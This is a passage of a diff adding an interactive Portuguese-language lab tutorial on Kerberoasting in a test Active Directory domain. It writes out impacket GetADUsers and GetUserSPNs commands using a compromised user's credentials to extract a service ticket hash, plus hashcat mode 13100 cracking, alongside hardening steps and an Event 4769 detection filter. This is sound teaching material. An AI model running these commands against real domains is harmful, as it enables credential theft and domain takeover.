-    document.getElementById("next").addEventListener("click", () => show(current + 1));
+  <div class="card">
+    <div class="card-title"><span class="icon">🎯</span> Por que isso é um problema?</div>
+    <p style="margin-bottom: 14px;">Três condições que, juntas, criam risco crítico:</p>
+    <table>
+      <tr><th>#</th><th>Condição</th><th>No laboratório</th></tr>
+      <tr>
+        <td>1</td>
+        <td>Conta com SPN registrado</td>
+        <td><span class="risk-badge risk-medium">✓ svc_sql tem SPN</span></td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td>Senha fraca ou antiga</td>
+        <td><span class="risk-badge risk-critical">✓ Password123!</span></td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td>Privilégios altos</td>
+        <td><span class="risk-badge risk-critical">✓ Domain Admins</span></td>
+      </tr>
+    </table>
+  </div>
 
-    document.addEventListener("keydown", (event) => {
-      if (["ArrowRight", "PageDown", " "].includes(event.key)) {
-        event.preventDefault();
-        show(current + 1);
+  <div class="analogy">
+    <p class="analogy-title">🏰 Metáfora Completa</p>
+    <table style="margin-top:0;">
+      <tr><th>Mundo real</th><th>Kerberos</th></tr>
+      <tr><td>Alice, funcionária vítima de phishing</td><td>Conta comprometida usada pelo atacante</td></tr>
+      <tr><td>Recepção do castelo</td><td>Domain Controller (KDC)</td></tr>
+      <tr><td>Crachá para entrar na sala do SQL</td><td>Ticket TGS</td></tr>
+      <tr><td>Cadeado do crachá</td><td>Cifra com senha de svc_sql</td></tr>
+      <tr><td>Tentar abrir o cadeado em casa</td><td>Quebra de hash offline</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🧠</span> Teste seu entendimento</div>
+    <div class="quiz-q">O que torna o Kerberoasting possível mesmo sem privilégios de administrador?</div>
+    <div class="quiz-opts" id="q1-opts">
+      <div class="quiz-opt" onclick="quiz('q1', this, false)">O atacante precisa ser Domain Admin para requisitar um TGS.</div>
+      <div class="quiz-opt" onclick="quiz('q1', this, true)">Qualquer usuário autenticado pode solicitar um TGS para contas com SPN.</div>
+      <div class="quiz-opt" onclick="quiz('q1', this, false)">O DC não valida a identidade ao entregar tickets TGT.</div>
+    </div>
+    <div id="q1-feedback" class="quiz-feedback">
+      <strong>✅ Correto!</strong> O Kerberos permite que qualquer usuário autenticado requisite tickets de serviço. O DC não questiona a intenção — ele simplesmente entrega o ticket cifrado com a senha da conta-alvo.
+    </div>
+  </div>
+
+  <div class="evidence-section">
+    <div class="evidence-heading">Evidências reais // origem da vulnerabilidade</div>
+    <div class="evidence-grid">
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/windows/04-svc-sql-spn.png" alt="Atributo servicePrincipalName da conta svc_sql" data-zoomable>
+        <figcaption>O atributo servicePrincipalName registra MSSQLSvc/sql.lab.local:1433 e torna a conta elegível para receber TGS.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/windows/05-svc-sql-domain-admins.png" alt="Conta svc_sql associada ao grupo Domain Admins" data-zoomable>
+        <figcaption>A má configuração proposital aumenta o impacto: svc_sql aparece como membro de Domain Admins.</figcaption>
+      </figure>
+    </div>
+  </div>
+
+  <button class="btn-next" id="btn-phase1" onclick="completePhase(1)" disabled>Responda o quiz para avançar</button>
+</section>
+
+<!-- ════════════════════════════════════
+     FASE 2 — ATAQUE
+════════════════════════════════════ -->
+<section class="phase" id="phase-2">
+  <div class="phase-header">
+    <p class="phase-number">Fase III · Execução</p>
+    <h2>A Infiltração</h2>
+    <p class="phase-desc">Execute o ataque passo a passo. Cada comando revela uma etapa da operação.</p>
+  </div>
+
+  <div class="analogy" style="margin-bottom: 20px;">
+    <p class="analogy-title">🎣 Ponto de partida — Como o atacante conseguiu a conta de alice?</p>
+    <p>Alice não é o atacante. Ela é uma <strong>vítima</strong>. O atacante obteve as credenciais dela por um destes caminhos comuns:</p>
+    <table style="margin-top: 12px;">
+      <tr><th>Vetor</th><th>Como ocorre</th></tr>
+      <tr><td>🎣 Phishing</td><td>Alice clicou num link falso e digitou a senha num portal imitando o login da empresa</td></tr>
+      <tr><td>🔑 Senha fraca</td><td>A senha de Alice era simples (ex: <code>Alice@2024</code>) e foi quebrada por força bruta ou spray</td></tr>
+      <tr><td>💾 Credential dump</td><td>O atacante já tinha acesso a outra máquina e encontrou credenciais salvas</td></tr>
+    </table>
+    <p style="margin-top: 10px; color: var(--muted); font-size: 13px;">Com as credenciais de alice, o atacante tem um <em>pé dentro do domínio</em> — e isso é tudo que o Kerberoasting precisa.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">📡</span> Passo 1 — Verificar conectividade com o DC</div>
+    <p style="margin-bottom: 14px; color: var(--muted);">Antes de qualquer operação, confirmar que o Kali alcança o Domain Controller.</p>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+        <span class="terminal-title">kali@kali — ping ao DC</span>
+      </div>
+      <div class="terminal-body">
+        <span class="t-prompt">┌──(kali㉿kali)-[~]<br>└─$ </span><span class="t-cmd">ping -c 4 172.24.173.229</span><br>
+        <span class="t-out">PING 172.24.173.229 (172.24.173.229) 56(84) bytes of data.<br>
+64 bytes from 172.24.173.229: icmp_seq=1 ttl=128 time=0.329 ms<br>
+64 bytes from 172.24.173.229: icmp_seq=2 ttl=128 time=0.340 ms<br>
+--- 172.24.173.229 ping statistics ---<br>
+4 packets transmitted, 4 received, </span><span class="t-ok">0% packet loss</span>
+      </div>
+    </div>
+    <p style="color: var(--muted); font-size: 13px;">✔ Conectividade confirmada. Rota livre até o Domain Controller.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🔍</span> Passo 2 — Enumerar usuários do domínio</div>
+    <p style="margin-bottom: 14px; color: var(--muted);">Com as credenciais de <code>alice</code> em mãos — obtidas via phishing ou ataque de senha fraca — o atacante lista todos os usuários do domínio a partir do Kali.</p>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+        <span class="terminal-title">impacket-GetADUsers — enumeração de usuários</span>
+      </div>
+      <div class="terminal-body">
+        <span class="t-prompt">└─$ </span><span class="t-cmd">impacket-GetADUsers lab.local/alice:'Aluno@123456!' -dc-ip 172.24.173.229 -all</span><br>
+        <span class="t-out"><br>Name          Email    PasswordLastSet          LastLogon<br>
+────────────  ───────  ───────────────────────  ────────<br>
+Administrator          2026-05-24 10:51:48      ...<br>
+alice                  2026-05-24 11:11:45      ...<br>
+Bob                    2026-05-24 11:12:49      ...<br></span>
+        <span class="t-highlight">svc_sql                2026-05-24 11:16:18      ...</span>
+      </div>
+    </div>
+    <p style="color: var(--muted); font-size: 13px;">↑ <code>svc_sql</code> aparece no domínio. Próximo passo: verificar se tem SPN.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🎟️</span> Passo 3 — Requisitar o ticket TGS</div>
+    <p style="margin-bottom: 14px; color: var(--muted);">Este é o coração do ataque. <code>GetUserSPNs</code> encontra contas com SPN e requisita o ticket criptografado.</p>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+        <span class="terminal-title">GetUserSPNs — extração do TGS</span>
+      </div>
+      <div class="terminal-body">
+        <span class="t-prompt">└─$ </span><span class="t-cmd">impacket-GetUserSPNs lab.local/alice:'Aluno@123456!' \<br>&nbsp;&nbsp;-dc-ip 172.24.173.229 -request -outputfile hashes.txt</span><br><br>
+        <span class="t-out">ServicePrincipalName       Name     MemberOf<br>
+──────────────────────────  ───────  ──────────────────────────────────<br></span>
+        <span class="t-highlight">MSSQLSvc/sql.lab.local:1433  svc_sql  CN=Domain Admins,...</span><br><br>
+        <span class="t-ok">[-] CCache file not found. Skipping...<br>[*] Hash salvo em hashes.txt</span>
+      </div>
+    </div>
+    <div class="analogy" style="margin-top:14px;">
+      <p class="analogy-title">🔑 O que aconteceu?</p>
+      <p>O atacante tem as credenciais de Alice — ela caiu num phishing e nem sabe disso. Com o crachá dela, ele pede ao DC um crachá de acesso ao SQL. O DC entrega sem questionar — afinal, Alice é funcionária válida. Mas o crachá está <strong>lacrado com a senha de svc_sql</strong>. O atacante não precisa entrar na sala. Ele só precisa do lacre — e vai quebrá-lo offline, na taverna.</p>
+    </div>
+  </div>
+
+  <div class="evidence-section">
+    <div class="evidence-heading">Evidências reais // execução no Kali</div>
+    <div class="evidence-grid">
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/kali/01-ping-dc.png" alt="Ping do Kali para o Domain Controller" data-zoomable>
+        <figcaption>O ping confirma comunicação IP com o DC em 172.24.173.229.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/kali/02-nslookup-lab-local.png" alt="Resolução DNS do domínio lab.local" data-zoomable>
+        <figcaption>O DNS do DC resolve lab.local, requisito importante para o funcionamento correto do AD.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/kali/03-getadusers-alice.png" alt="Enumeração de usuários com GetADUsers" data-zoomable>
+        <figcaption>A conta comum Alice autentica e consulta usuários do domínio, incluindo svc_sql.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/kali/04-getuserspns-svc-sql.png" alt="Solicitação do TGS da conta svc_sql" data-zoomable>
+        <figcaption>GetUserSPNs localiza o SPN, solicita o ticket e grava o material Kerberos em hashes.txt.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/kali/05-hashes-txt-gerado.png" alt="Arquivo hashes.txt contendo o hash Kerberos" data-zoomable>
+        <figcaption>O marcador $krb5tgs$ confirma que o TGS foi salvo em formato aceito pelo Hashcat.</figcaption>
+      </figure>
+    </div>
+  </div>
+
+  <!-- TERMINAL INTERATIVO -->
+  <div class="card">
+    <div class="card-title">Console guiado — execute a cadeia do ataque</div>
+    <p style="margin-bottom: 14px; color: var(--muted);">O terminal valida parâmetros, respeita a ordem das etapas e explica tentativas incorretas. A fase só termina quando o hash estiver salvo e confirmado.</p>
+    <div class="terminal mission-terminal" id="mission-attack">
+      <div class="terminal-bar">
+        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+        <span class="terminal-title">kali@kali — operação Kerberoast</span>
+      </div>
+      <div class="terminal-body">
+        <div class="mission-log" id="attack-log"></div>
+        <div class="mission-input-row">
+          <span class="t-prompt">kali@kali:~$</span>
+          <input id="attack-input" class="t-input" type="text" autocomplete="off" spellcheck="false" placeholder="digite o próximo comando" onkeydown="missionKey(event,'attack')">
+        </div>
+      </div>
+    </div>
+    <div class="mission-status" id="attack-status"></div>
+    <div class="terminal-actions">
+      <button class="term-action" type="button" onclick="fillMissionCommand('attack')">Preencher próximo comando</button>
+      <button class="term-action" type="button" onclick="runMission('attack')">Executar</button>
+      <button class="term-action" type="button" onclick="clearMissionLog('attack')">Limpar console</button>
+    </div>
+  </div>
+
+  <button class="btn-next" id="btn-phase2" onclick="completePhase(2)" disabled>Execute o comando para avançar</button>
+</section>
+
+<!-- ════════════════════════════════════
+     FASE 3 — HASH CRACKING
+════════════════════════════════════ -->
+<section class="phase" id="phase-3">
+  <div class="phase-header">
+    <p class="phase-number">Fase IV · Quebra Offline</p>
+    <h2>Quebrando o Cadeado</h2>
+    <p class="phase-desc">O ticket está em mãos. Agora o ataque acontece completamente offline — sem tocar no DC.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">📄</span> Wordlist do laboratório</div>
+    <p style="margin-bottom: 12px; color: var(--muted);">Uma lista pequena de senhas candidatas. Em ambientes reais, wordlists chegam a bilhões de entradas.</p>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+        <span class="terminal-title">cat wordlist.txt</span>
+      </div>
+      <div class="terminal-body">
+        <span class="t-prompt">└─$ </span><span class="t-cmd">cat wordlist.txt</span><br>
+        <span class="t-out">herdoc<br>Password123!<br>Aluno@123456!<br>Admin123!<br>Empresa123!</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">⚡</span> Hashcat — Modo 13100 (TGS-REP)</div>
+    <p style="margin-bottom: 12px; color: var(--muted);">O modo <code>-m 13100</code> é específico para hashes Kerberos TGS-REP (Kerberoasting).</p>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+        <span class="terminal-title">hashcat — quebrando o hash</span>
+      </div>
+      <div class="terminal-body">
+        <span class="t-prompt">└─$ </span><span class="t-cmd">hashcat -m 13100 hashes.txt wordlist.txt --force</span><br><br>
+        <span class="t-out">Session.........: hashcat<br>
+Status..........: </span><span class="t-ok">Cracked</span><br>
+        <span class="t-out">Hash.Mode.......: 13100 (Kerberos 5, etype 23, TGS-REP)<br>
+Hash.Target.....: $krb5tgs$23$*svc_sql$LAB.LOCAL$...<br>
+Speed.#01.......: 57 MH/s<br>
+Candidates.#01..: Password123! → Empresa123!<br><br></span>
+        <span class="t-highlight">Candidates.Engine: Pure Kernel<br>
+Candidate.Engine.: Password123! → Empresa123!<br>
+Started: Thu Jun 25 18:30:28 2026<br>
+Stopped: Thu Jun 25 18:30:28 2026</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="evidence-section">
+    <div class="evidence-heading">Evidências reais // quebra offline</div>
+    <div class="evidence-grid">
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/kali/06-wordlist-lab.png" alt="Wordlist usada na prova de conceito" data-zoomable>
+        <figcaption>A wordlist contém poucas senhas candidatas, incluindo a senha fraca configurada no laboratório.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/kali/07-hashcat-cracked-password.png" alt="Hashcat mostrando o status Cracked" data-zoomable>
+        <figcaption>O modo 13100 identifica o TGS-REP e retorna Status: Cracked.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/kali/08-hashcat-show-password.png" alt="Hashcat exibindo a senha Password123" data-zoomable>
+        <figcaption>O comando --show relaciona o material Kerberos à senha Password123!, comprovando o risco.</figcaption>
+      </figure>
+    </div>
+  </div>
+
+  <!-- TERMINAL INTERATIVO -->
+  <div class="card">
+    <div class="card-title">Console guiado — quebra offline</div>
+    <p style="margin-bottom: 12px; color: var(--muted);">Confira a wordlist, execute o Hashcat no modo correto e valide a senha recuperada.</p>
+    <div class="terminal mission-terminal" id="mission-crack">
+      <div class="terminal-bar">
+        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+        <span class="terminal-title">kali@kali — cracking offline</span>
+      </div>
+      <div class="terminal-body">
+        <div class="mission-log" id="crack-log"></div>
+        <div class="mission-input-row">
+          <span class="t-prompt">kali@kali:~$</span>
+          <input id="crack-input" class="t-input" type="text" autocomplete="off" spellcheck="false" placeholder="digite o próximo comando" onkeydown="missionKey(event,'crack')">
+        </div>
+      </div>
+    </div>
+    <div class="mission-status" id="crack-status"></div>
+    <div class="terminal-actions">
+      <button class="term-action" type="button" onclick="fillMissionCommand('crack')">Preencher próximo comando</button>
+      <button class="term-action" type="button" onclick="runMission('crack')">Executar</button>
+      <button class="term-action" type="button" onclick="clearMissionLog('crack')">Limpar console</button>
+    </div>
+  </div>
+
+  <div class="card" id="impact-card" style="display:none; border-color: rgba(224,85,85,.4);">
+    <div class="card-title"><span class="icon">💀</span> Impacto do Ataque</div>
+    <div class="flow">
+      <div class="flow-step">
+        <span class="fs-label">conta de alice</span>
+        <span class="fs-name">comprometida</span>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step gold">
+        <span class="fs-label">TGS cifrado</span>
+        <span class="fs-name">hashes.txt</span>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step red">
+        <span class="fs-label">Hashcat</span>
+        <span class="fs-name">Password123!</span>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step red">
+        <span class="fs-label">svc_sql</span>
+        <span class="fs-name">Domain Admins 💀</span>
+      </div>
+    </div>
+    <p style="color: var(--red); font-size: 13px; margin-top: 12px;">⚠️ A conta de alice foi comprometida (phishing / senha fraca) e usada como trampolim. Nenhum 0-day. Nenhum exploit. Só uma vítima desavisada, uma senha fraca de serviço e um privilégio excessivo — e o domínio inteiro caiu.</p>
+  </div>
+
+  <button class="btn-next" id="btn-phase3" onclick="completePhase(3)" disabled>Execute o comando para avançar</button>
+</section>
+
+<!-- ════════════════════════════════════
+     FASE 4 — HARDENING
+════════════════════════════════════ -->
+<section class="phase" id="phase-4">
+  <div class="phase-header">
+    <p class="phase-number">Fase V · Defesa</p>
+    <h2>Fortalecendo o Castelo</h2>
+    <p class="phase-desc">Agora que o ataque foi demonstrado, aplique as medidas de hardening. Marque cada ação conforme implementa.</p>
+  </div>
+
+  <div class="evidence-section">
+    <div class="evidence-heading">Evidências reais // aplicação do hardening</div>
+    <div class="evidence-grid">
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/windows/09-hardening-remover-domain-admins.gif" alt="Remoção de svc_sql do grupo Domain Admins" data-zoomable>
+        <figcaption>Menor privilégio: remoção de svc_sql do grupo Domain Admins.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/windows/10-hardening-reset-senha-svc-sql.gif" alt="Redefinição da senha de svc_sql" data-zoomable>
+        <figcaption>Rotação da credencial que foi recuperada durante a prova de conceito.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/windows/11-hardening-account-options-svc-sql.png" alt="Opções de segurança da conta svc_sql" data-zoomable>
+        <figcaption>Revisão das opções da conta para eliminar configurações inseguras.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/windows/12-hardening-spn-ainda-existe.png" alt="SPN mantido após o hardening" data-zoomable>
+        <figcaption>O SPN pode continuar existindo quando o serviço ainda precisa dele; a defesa está na senha forte e no menor privilégio.</figcaption>
+      </figure>
+      <figure class="evidence-card">
+        <img src="../documentacao/prints/windows/13-hardening-evento-4769-kerberos.png" alt="Evento 4769 no Visualizador de Eventos" data-zoomable>
+        <figcaption>O evento 4769 registra solicitações TGS e oferece telemetria para investigar padrões anormais.</figcaption>
+      </figure>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Console guiado — validar as correções no Active Directory</div>
+    <p style="margin-bottom: 12px; color: var(--muted);">Aplique menor privilégio, valide os grupos, rotacione a senha comprometida e consulte os eventos Kerberos.</p>
+    <div class="terminal mission-terminal" id="mission-hardening">
+      <div class="terminal-bar">
+        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+        <span class="terminal-title">PowerShell — Domain Controller</span>
+      </div>
+      <div class="terminal-body">
+        <div class="mission-log" id="hardening-log"></div>
+        <div class="mission-input-row">
+          <span class="t-prompt">PS C:\AD-Lab&gt;</span>
+          <input id="hardening-input" class="t-input" type="text" autocomplete="off" spellcheck="false" placeholder="digite o próximo comando" onkeydown="missionKey(event,'hardening')">
+        </div>
+      </div>
+    </div>
+    <div class="mission-status" id="hardening-status"></div>
+    <div class="terminal-actions">
+      <button class="term-action" type="button" onclick="fillMissionCommand('hardening')">Preencher próximo comando</button>
+      <button class="term-action" type="button" onclick="runMission('hardening')">Executar</button>
+      <button class="term-action" type="button" onclick="clearMissionLog('hardening')">Limpar console</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">✅</span> Checklist de Hardening — marque cada item</div>
+    <ul class="checklist" id="hardening-list">
+      <li onclick="checkItem(this, 'h1')">
+        <div class="check-box" id="h1-box"></div>
+        <div class="check-text">
+          <div class="check-title">Remover svc_sql do grupo Domain Admins</div>
+          <div class="check-sub">Princípio do menor privilégio. Contas de serviço não precisam de acesso total ao domínio.</div>
+        </div>
+      </li>
+      <li onclick="checkItem(this, 'h2')">
+        <div class="check-box" id="h2-box"></div>
+        <div class="check-text">
+          <div class="check-title">Trocar para senha longa, aleatória e única</div>
+          <div class="check-sub">Senhas de 25+ caracteres aleatórios tornam o cracking offline inviável mesmo com wordlists avançadas.</div>
+        </div>
+      </li>
+      <li onclick="checkItem(this, 'h3')">
+        <div class="check-box" id="h3-box"></div>
+        <div class="check-text">
+          <div class="check-title">Migrar para gMSA (Group Managed Service Account)</div>
+          <div class="check-sub">O AD gerencia e rotaciona a senha automaticamente a cada 30 dias. Sem senha humana = sem risco de senha fraca.</div>
+        </div>
+      </li>
+      <li onclick="checkItem(this, 'h4')">
+        <div class="check-box" id="h4-box"></div>
+        <div class="check-text">
+          <div class="check-title">Remover SPNs desnecessários</div>
+          <div class="check-sub">SPN sem serviço ativo é superfície de ataque sem utilidade. Audite e remova periodicamente.</div>
+        </div>
+      </li>
+      <li onclick="checkItem(this, 'h5')">
+        <div class="check-box" id="h5-box"></div>
+        <div class="check-text">
+          <div class="check-title">Monitorar Event ID 4769 — TGS Request</div>
+          <div class="check-sub">Solicitações TGS com tipo de criptografia RC4 (0x17) são indicador primário de Kerberoasting em progresso.</div>
+        </div>
+      </li>
+      <li onclick="checkItem(this, 'h6')">
+        <div class="check-box" id="h6-box"></div>
+        <div class="check-text">
+          <div class="check-title">Desabilitar criptografia RC4 onde possível</div>
+          <div class="check-sub">Exigir AES-128/AES-256 aumenta drasticamente o custo computacional para quebra offline.</div>
+        </div>
+      </li>
+      <li onclick="checkItem(this, 'h7')">
+        <div class="check-box" id="h7-box"></div>
+        <div class="check-text">
+          <div class="check-title">Auditar contas com senha que nunca expira</div>
+          <div class="check-sub">Senhas antigas ficam nos dicionários de breach. Rotação periódica é obrigatória para contas de serviço sem gMSA.</div>
+        </div>
+      </li>
+      <li onclick="checkItem(this, 'h8')">
+        <div class="check-box" id="h8-box"></div>
+        <div class="check-text">
+          <div class="check-title">Treinar usuários contra phishing e senhas fracas</div>
+          <div class="check-sub">Alice foi o ponto de entrada. Conscientização + MFA para usuários comuns elimina o principal vetor inicial do ataque.</div>
+        </div>
+      </li>
+    </ul>
+    <div id="hardening-progress" style="margin-top:20px; color: var(--muted); font-size: 13px; text-align:center;">
+      <span id="hard-count">0</span>/8 medidas aplicadas
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🔍</span> Detecção — Event ID 4769</div>
+    <p style="margin-bottom: 12px; color: var(--muted);">Configure um filtro no Event Viewer para pegar Kerberoasting em tempo real:</p>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+        <span class="terminal-title">PowerShell — filtro de eventos</span>
+      </div>
+      <div class="terminal-body">
+        <span class="t-comment"># Buscar solicitações TGS suspeitas (RC4 = possível Kerberoasting)</span><br>
+        <span class="t-cmd">Get-WinEvent -FilterHashtable @{</span><br>
+        <span class="t-cmd">&nbsp;&nbsp;LogName = 'Security'</span><br>
+        <span class="t-cmd">&nbsp;&nbsp;Id = 4769</span><br>
+        <span class="t-cmd">&nbsp;&nbsp;StartTime = (Get-Date).AddHours(-24)</span><br>
+        <span class="t-cmd">} | Where-Object {</span><br>
+        <span class="t-cmd">&nbsp;&nbsp;$_.Message -match 'Encryption Type: 0x17'  </span><span class="t-comment"># RC4</span><br>
+        <span class="t-cmd">} | Format-List TimeCreated, Message</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">📊</span> Antes × Depois do Hardening</div>
+    <table>
+      <tr><th>Configuração</th><th>Antes (Vulnerável)</th><th>Depois (Seguro)</th></tr>
+      <tr>
+        <td>Senha de svc_sql</td>
+        <td style="color: var(--red);">Password123! (fraca)</td>
+        <td style="color: var(--green);">gMSA rotaciona auto</td>
+      </tr>
+      <tr>
+        <td>Grupos</td>
+        <td style="color: var(--red);">Domain Admins</td>
+        <td style="color: var(--green);">Apenas o necessário</td>
+      </tr>
+      <tr>
+        <td>Criptografia TGS</td>
+        <td style="color: var(--red);">RC4 (0x17)</td>
+        <td style="color: var(--green);">AES-256 apenas</td>
+      </tr>
+      <tr>
+        <td>Monitoramento</td>
+        <td style="color: var(--red);">Nenhum</td>
+        <td style="color: var(--green);">Alerta no Event 4769</td>
+      </tr>
+      <tr>
+        <td>Expiração de senha</td>
+        <td style="color: var(--red);">Never</td>
+        <td style="color: var(--green);">gMSA: 30 dias auto</td>
+      </tr>
+    </table>
+  </div>
+
+  <button class="btn-next" id="btn-phase4" onclick="completePhase(4)" disabled>Aplique todas as medidas para finalizar a missão</button>
+</section>
+
+<!-- ════════════════════════════════════
+     FASE 5 — VITÓRIA
+════════════════════════════════════ -->
+<section class="phase" id="phase-5">
+  <div class="phase-header" style="padding-bottom:0">
+    <p class="phase-number">Missão Concluída</p>
+    <h2>O Castelo Está Seguro</h2>
+  </div>
+
+  <div id="phase-victory">
+    <div class="victory-icon">🏆</div>
+    <div class="victory-badge">
+      <h3>Certificado de Operação</h3>
+      <p>Kerberoasting & Hardening em Windows/AD</p>
+      <p style="margin-top:8px; font-family:'JetBrains Mono',monospace; font-size:11px; color: var(--gold);">lab.local · svc_sql · Domain Admins eliminado</p>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">📝</span> Resumo da Missão</div>
+    <div class="flow">
+      <div class="flow-step">
+        <span class="fs-label">alice comprometida</span>
+        <span class="fs-name">+ SPN descoberto</span>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step gold">
+        <span class="fs-label">Extração</span>
+        <span class="fs-name">TGS / hashes.txt</span>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step red">
+        <span class="fs-label">Cracking</span>
+        <span class="fs-name">Password123!</span>
+      </div>
+      <div class="flow-arrow">→</div>
+      <div class="flow-step green">
+        <span class="fs-label">Hardening</span>
+        <span class="fs-name">Castelo seguro</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">💡</span> Mensagem Final</div>
+    <p style="font-size: 15px; line-height: 1.8;">Kerberoasting não é um exploit sofisticado. É um abuso de comportamento <em>legítimo</em> do protocolo Kerberos. O ponto de entrada foi a conta de uma usuária comum — alice — comprometida via phishing ou senha fraca. A partir daí, bastou requisitar um ticket público, quebrar a senha offline e usar o privilégio excessivo da conta de serviço. A defesa precisa atuar em <strong>todas as camadas</strong>: conscientização de usuários, senhas fortes, menor privilégio e monitoramento ativo.</p>
+    <div class="divider"></div>
+    <p style="color: var(--muted); font-size: 13px;">🔬 Ambiente: lab.local · Hyper-V · Windows Server + Kali Linux<br>
+    🛠️ Ferramentas: impacket, hashcat<br>
+    📋 Escopo: laboratório acadêmico controlado</p>
+  </div>
+
+  <div style="text-align:center; margin: 40px 0 60px;">
+    <button class="btn-next" onclick="restart()" style="background: var(--bg3); color: var(--gold); border: 1px solid var(--gold); margin:0 auto;">🔄 Reiniciar Missão</button>
+  </div>
+</section>
+
+</div><!-- /wrap -->
+
+<div class="evidence-viewer" id="evidence-viewer" role="dialog" aria-modal="true" aria-labelledby="viewer-title" hidden>
+  <div class="viewer-toolbar">
+    <div class="viewer-title" id="viewer-title">Evidência do laboratório</div>
+    <div class="viewer-controls">
+      <button class="viewer-control" id="viewer-minus" type="button" title="Diminuir zoom" aria-label="Diminuir zoom">−</button>
+      <output class="viewer-percent" id="viewer-percent" aria-live="polite">100%</output>
+      <button class="viewer-control" id="viewer-plus" type="button" title="Aumentar zoom" aria-label="Aumentar zoom">+</button>
+      <button class="viewer-control" id="viewer-close" type="button" title="Fechar visualizador" aria-label="Fechar visualizador">×</button>
+    </div>
+  </div>
+  <div class="viewer-stage" id="viewer-stage">
+    <img class="viewer-image" id="viewer-image" alt="">
+  </div>
+  <div class="viewer-caption" id="viewer-caption"></div>
+</div>
+
+<script>
+// ── ESTADO E PERSISTÊNCIA ──
+const TOTAL = 5;
+const STORAGE_PREFIX = 'kerb-merged-';
+
+function loadState(key, fallback) {
+  try {
+    const value = localStorage.getItem(STORAGE_PREFIX + key);
+    return value ? JSON.parse(value) : fallback;
+  } catch {
+    return fallback;
+  }
+}
+
+function storeState(key, value) {
+  localStorage.setItem(STORAGE_PREFIX + key, JSON.stringify(value));
+}
+
+let currentPhase = Number(loadState('current-phase', 0));
+let completedPhases = new Set(loadState('completed-phases', []));
+let hardeningChecked = new Set(loadState('hardening-checklist', []));
+let quizPassed = Boolean(loadState('quiz-passed', false));
+let missionState = loadState('missions', {
+  attack: { done: [], history: [] },
+  crack: { done: [], history: [] },
+  hardening: { done: [], history: [] }
+});
+
+const missions = {
+  attack: {
+    button: 'btn-phase2',
+    tasks: [
+      {
+        command: 'ping -c 4 172.24.173.229',
+        hint: 'Confirme primeiro se o Kali alcança o endereço IP do Domain Controller.',
+        output: `PING 172.24.173.229 (172.24.173.229) 56(84) bytes of data.\n64 bytes from 172.24.173.229: icmp_seq=1 ttl=128 time=0.57 ms\n64 bytes from 172.24.173.229: icmp_seq=2 ttl=128 time=0.34 ms\n64 bytes from 172.24.173.229: icmp_seq=3 ttl=128 time=0.36 ms\n64 bytes from 172.24.173.229: icmp_seq=4 ttl=128 time=0.33 ms\n4 packets transmitted, 4 received, 0% packet loss`
+      },
+      {
+        command: 'nslookup lab.local 172.24.173.229',
+        hint: 'Valide o DNS consultando lab.local diretamente no DC.',
+        output: `Server:  172.24.173.229\nAddress: 172.24.173.229#53\n\nName:    lab.local\nAddress: 172.24.173.229`
+      },
+      {
+        command: "impacket-GetADUsers lab.local/alice:'Aluno@123456!' -dc-ip 172.24.173.229 -all",
+        hint: 'Use a conta comum Alice para consultar todos os usuários no DC correto.',
